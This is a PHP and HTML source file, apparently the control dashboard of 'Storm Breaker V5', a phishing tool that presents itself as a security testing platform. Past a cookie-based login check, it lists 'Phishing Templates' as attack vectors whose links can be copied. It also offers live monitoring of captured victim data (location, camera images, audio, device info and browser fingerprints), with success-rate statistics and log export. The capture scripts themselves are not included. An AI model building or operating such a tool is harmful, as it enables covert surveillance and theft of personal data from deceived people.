<?php
session_start();
include "./assets/components/login-arc.php";

if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }
}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/");
    change_token($client_token);
}
else {
    header('location: login-v4.php');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link href="./assets/css/style.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Storm Breaker - V5 Ultimate</title>
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --success: #2ecc71;
            --danger: #e74c3c;
            --warning: #f39c12;
            --info: #3498db;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        body.dark-mode {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        }
        body.dark-mode .dashboard-card { background: #2d2d44; color: #fff; border-color: #3d3d5c; }
        body.dark-mode textarea, body.dark-mode input, body.dark-mode select {
            background: #1a1a2e; color: #fff; border-color: #3d3d5c;
        }
        .header-bar {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px 30px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        body.dark-mode .header-bar { background: rgba(45, 45, 68, 0.95); }
        body.dark-mode .logo-section p { color: #aaa!important; }
        .logo-section h1 {
            margin: 0;
            color: var(--primary);
            font-size: 2rem;
            font-weight: bold;
        }
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 15px;
            padding: 20px;
            color: white;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
            cursor: pointer;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-card i { font-size: 2rem; margin-bottom: 10px; }
        .stat-card h3 { margin: 0; font-size: 1.8rem; font-weight: bold; }
        .stat-card p { margin: 5px 0 0 0; opacity: 0.9; font-size: 0.9rem; }
        .dashboard-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        body.dark-mode .dashboard-card h3 { color: #fff; }
        .btn-modern {
            border: none;
            border-radius: 10px;
            padding: 10px 20px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            cursor: pointer;
        }
        .btn-modern:hover { transform: translateY(-2px); }
        .btn-primary-modern { background: linear-gradient(135deg, #3498db 0%, #2980b9 100%); color: white; }
        .btn-success-modern { background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%); color: white; }
        .btn-danger-modern { background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; }
        .btn-warning-modern { background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); color: white; }
        .btn-secondary-modern { background: linear-gradient(135deg, #95a5a6 0%, #7f8c8d 100%); color: white; }
        .control-panel {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 20px;
        }
        .link-card {
            background: white;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            border: 2px solid #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: all 0.3s ease;
        }
        body.dark-mode .link-card { background: #2d2d44; border-color: #3d3d5c; }
        .link-card:hover { border-color: var(--primary); box-shadow: 0 4px 12px rgba(102, 126, 234, 0.2); }
        .link-text {
            flex-grow: 1;
            padding: 10px;
            font-family: 'Courier New', monospace;
            color: var(--primary);
            word-break: break-all;
        }
        textarea#result {
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            width: 100%;
        }
        .badge-status {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
        }
        .badge-online { background: #2ecc71; color: white; }
        .badge-offline { background: #e74c3c; color: white; }
        .theme-toggle {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            border-radius: 50px;
            padding: 10px 20px;
            cursor: pointer;
        }
        .filter-controls {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        .filter-controls input, .filter-controls select {
            padding: 8px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
        }
        .quick-stats {
            display: flex;
            gap: 15px;
            justify-content: space-around;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        body.dark-mode .quick-stats { background: #1a1a2e; }
        .quick-stat-item {
            text-align: center;
        }
        .quick-stat-item .value {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--primary);
        }
        .quick-stat-item .label {
            font-size: 0.85rem;
            color: #666;
        }
        body.dark-mode .quick-stat-item .label { color: #aaa; }
        @media (max-width: 768px) {
            .header-bar { flex-direction: column; }
            .stats-container { grid-template-columns: 1fr; }
        }
    </style>
</head>

<body id="ourbody" onload="check_new_version(); initializeStats();">

    <div class="header-bar">
        <div class="logo-section">
            <h1><i class="fas fa-bolt"></i> Storm Breaker V5</h1>
            <p style="margin: 0; color: #666;">Ultimate Security Testing Platform</p>
        </div>
        <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
            <span class="badge-status badge-online" id="listener-status">
                <i class="fas fa-circle"></i> Active
            </span>
            <button class="theme-toggle" onclick="toggleTheme()" title="Dark Mode">
                <i class="fas fa-moon" id="theme-icon"></i>
            </button>
            <button class="btn btn-danger btn-modern" onclick="if(confirm('Logout?')) location.href='login-v4.php'">
                <i class="fas fa-sign-out-alt"></i>
            </button>
        </div>
    </div>

    <div class="stats-container">
        <div class="stat-card" onclick="updateStats()">
            <i class="fas fa-link"></i>
            <h3 id="total-links">0</h3>
            <p>Active Templates</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);" onclick="showAnalytics()">
            <i class="fas fa-chart-bar"></i>
            <h3 id="analytics-total">0</h3>
            <p>Total Captures</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);">
            <i class="fas fa-clock"></i>
            <h3 id="session-time">00:00</h3>
            <p>Session Time</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);" onclick="showTimeline()">
            <i class="fas fa-history"></i>
            <h3 id="recent-activity">0</h3>
            <p>Recent Events</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%);">
            <i class="fas fa-calendar-day"></i>
            <h3 id="analytics-today">0</h3>
            <p>Today's Logs</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);">
            <i class="fas fa-hourglass-half"></i>
            <h3 id="analytics-hour">0</h3>
            <p>This Hour</p>
        </div>
    </div>

    <div class="dashboard-card">
        <h3><i class="fas fa-link"></i> Phishing Templates</h3>
        <p style="color: #666; margin-bottom: 20px;">Available attack vectors - Click to copy link</p>
        <div id="links"></div>
    </div>

    <div class="dashboard-card">
        <h3><i class="fas fa-terminal"></i> Live Monitoring</h3>
        
        <div class="quick-stats">
            <div class="quick-stat-item">
                <div class="value" id="total-logs">0</div>
                <div class="label">Total Logs</div>
            </div>
            <div class="quick-stat-item">
                <div class="value" id="log-rate">0/min</div>
                <div class="label">Capture Rate</div>
            </div>
            <div class="quick-stat-item">
                <div class="value" id="success-rate">0%</div>
                <div class="label">Success Rate</div>
            </div>
        </div>
        
        <div class="filter-controls">
            <input type="text" id="search-logs" placeholder="Search logs..." style="flex: 1; min-width: 200px;">
            <select id="filter-type">
                <option value="all">All Types</option>
                <option value="location">Location</option>
                <option value="image">Images</option>
                <option value="audio">Audio</option>
                <option value="device">Device Info</option>
                <option value="fingerprint">Fingerprint</option>
            </select>
            <button class="btn btn-primary-modern btn-modern" onclick="applyFilter()">
                <i class="fas fa-filter"></i> Filter
            </button>
        </div>

        <textarea class="form-control" placeholder="Waiting for data..." id="result" rows="12"></textarea>
        
        <div class="control-panel">
            <button class="btn-danger-modern btn-modern" id="btn-listen">
                <i class="fas fa-stop"></i> Stop
            </button>
            <button class="btn-success-modern btn-modern" id="soundToggle" onclick="toggleSound()">
                <i class="fas fa-volume-up"></i> Sound On
            </button>
            <button class="btn-primary-modern btn-modern" onclick="showTimeline()">
                <i class="fas fa-history"></i> Timeline
            </button>
            <button class="btn-primary-modern btn-modern" onclick="showAnalytics()">
                <i class="fas fa-chart-pie"></i> Analytics
            </button>
            <button class="btn-success-modern btn-modern" onclick="saveTextAsFile(result.value,'log.txt')">
                <i class="fas fa-download"></i> TXT
            </button>
            <button class="btn-success-modern btn-modern" onclick="exportJSON()">
                <i class="fas fa-file-code"></i> JSON
            </button>
            <button class="btn-warning-modern btn-modern" id="btn-clear">
                <i class="fas fa-trash"></i> Clear
            </button>
            <button class="btn-secondary-modern btn-modern" onclick="copyAllLogs()">
                <i class="fas fa-copy"></i> Copy
            </button>
        </div>
    </div>

    <div id="activityTimeline" style="display: none;"></div>

</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>
<script src="./assets/js/enhanced-features.js"></script>
<script src="./assets/js/advanced-features.js"></script>
